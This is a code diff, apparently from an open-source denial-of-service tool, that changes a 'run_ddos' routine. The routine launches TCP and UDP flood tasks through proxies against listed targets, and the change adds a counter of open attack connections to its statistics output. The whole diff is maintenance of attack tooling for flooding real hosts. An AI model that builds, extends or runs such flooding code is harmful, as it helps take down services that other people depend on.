@@ -167,6 +167,8 @@ async def run_ddos(args):
     )
     loop = asyncio.get_event_loop()
 
+    connections = set()
+
     def prepare_flooder(target: Target, method: str) -> Union[AsyncUdpFlood, AsyncTcpFlood]:
         if target.has_options:
             target_rpc = int(target.option(Target.OPTION_RPC, "0"))
@@ -182,7 +184,8 @@ async def run_ddos(args):
             method,
             proxies=proxies,
             loop=loop,
-            settings=settings
+            settings=settings,
+            connections=connections,
         )
 
     active_flooder_tasks = []
@@ -199,6 +202,7 @@ async def run_ddos(args):
             active_flooder_tasks.clear()
 
         tcp_flooders, udp_flooders = [], []
+        connections.clear()
         for target in targets:
             assert target.is_resolved, "Unresolved target cannot be used for attack"
             # udp://, method defaults to "UDP"
@@ -297,7 +301,8 @@ async def run_ddos(args):
             await asyncio.sleep(refresh_rate)
             show_statistic(
                 net_stats,
-                tcp_task_group.capacity if tcp_task_group is not None else None
+                tcp_task_group.capacity if tcp_task_group is not None else None,
+                len(connections),
             )
             if it >= 20:
                 it = 0
